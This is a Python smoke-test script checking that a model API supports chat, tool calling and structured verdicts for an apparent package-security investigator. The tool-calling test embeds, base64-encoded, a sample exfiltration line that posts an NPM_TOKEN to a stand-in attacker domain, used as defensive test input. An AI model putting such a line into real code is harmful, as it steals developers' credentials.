# /// script
# requires-python = ">=3.11"
# dependencies = ["openai>=1.40"]
# ///
"""Step 0 smoke test: prove the Meta Model API works for what the Spark investigator needs.

Checks: (1) plain chat, (2) a tool-calling round trip, (3) structured JSON output.

Run from the repo root:
    uv run --env-file .env service/scripts/smoke_spark.py [--model muse-spark-1.3]
"""

import argparse
import base64
import json
import os
import sys
import time

from openai import OpenAI

BASE_URL = "https://api.meta.ai/v1"
DEFAULT_MODEL = "muse-spark-1.3-contributor"  # cheaper; fine for dev on public packages

DECODE_TOOL = {
    "type": "function",
    "function": {
        "name": "decode",
        "description": "Decode an encoded string without executing it.",
        "parameters": {
            "type": "object",
            "properties": {
                "text": {"type": "string"},
                "format": {"type": "string", "enum": ["base64", "hex"]},
            },
            "required": ["text", "format"],
        },
    },
}

VERDICT_SCHEMA = {
    "type": "object",
    "properties": {
        "verdict": {"type": "string", "enum": ["allow", "block", "ask"]},
        "confidence": {"type": "string", "enum": ["low", "medium", "high"]},
        "reason": {"type": "string"},
    },
    "required": ["verdict", "confidence", "reason"],
    "additionalProperties": False,
}


def check_chat(client, model):
    resp = client.chat.completions.create(
        model=model,
        messages=[{"role": "user", "content": "Reply with exactly: bawabu ok"}],
    )
    text = resp.choices[0].message.content or ""
    return "bawabu ok" in text.lower(), text.strip(), resp.usage


def check_tool_call(client, model):
    payload = base64.b64encode(b"fetch('https://evil-collector.xyz', {body: process.env.NPM_TOKEN})").decode()
    messages = [
        {"role": "system", "content": "You are a package security investigator. Use tools to inspect data; never guess."},
        {"role": "user", "content": f"A package's install script contains this base64 blob. Decode it with the tool, then say in one sentence what it does: {payload}"},
    ]
    first = client.chat.completions.create(model=model, messages=messages, tools=[DECODE_TOOL])
    msg = first.choices[0].message
    if not msg.tool_calls:
        return False, f"no tool call; model said: {(msg.content or '').strip()[:200]}", first.usage

    call = msg.tool_calls[0]
    args = json.loads(call.function.arguments)
    decoded = base64.b64decode(args["text"]).decode() if args.get("format") == "base64" else bytes.fromhex(args["text"]).decode()
    messages.append(msg.model_dump(exclude_none=True))
    messages.append({"role": "tool", "tool_call_id": call.id, "content": decoded})

    second = client.chat.completions.create(model=model, messages=messages, tools=[DECODE_TOOL])
    answer = (second.choices[0].message.content or "").strip()
    ok = call.function.name == "decode" and args.get("format") == "base64" and bool(answer)
    return ok, f"called decode({args.get('format')}) -> answer: {answer[:200]}", second.usage


def check_structured(client, model):
    resp = client.chat.completions.create(
        model=model,
        messages=[{"role": "user", "content": "A date-picker package reads ~/.npmrc and POSTs it to an unknown domain on install. Give your verdict."}],
        response_format={"type": "json_schema", "json_schema": {"name": "verdict", "schema": VERDICT_SCHEMA, "strict": True}},
    )
    text = resp.choices[0].message.content or ""
    data = json.loads(text)
    ok = data.get("verdict") in ("allow", "block", "ask") and set(data) == set(VERDICT_SCHEMA["required"])
    return ok, json.dumps(data), resp.usage


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--model", default=DEFAULT_MODEL)
    args = parser.parse_args()

    if not os.environ.get("META_API_KEY"):
        sys.exit("META_API_KEY is not set. Put it in .env and run with: uv run --env-file .env ...")

    client = OpenAI(base_url=BASE_URL, api_key=os.environ["META_API_KEY"])
    print(f"model: {args.model}  base_url: {BASE_URL}\n")

    failed = 0
    for name, check in [("chat", check_chat), ("tool calling", check_tool_call), ("structured output", check_structured)]:
        start = time.monotonic()
        try:
            ok, detail, usage = check(client, args.model)
        except Exception as exc:  # report every check, even if one blows up
            ok, detail, usage = False, f"{type(exc).__name__}: {exc}", None
        secs = time.monotonic() - start
        tokens = f"{usage.prompt_tokens}+{usage.completion_tokens} tok" if usage else "-"
        print(f"[{'PASS' if ok else 'FAIL'}] {name:18} {secs:5.1f}s  {tokens}\n       {detail}\n")
        failed += not ok

    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
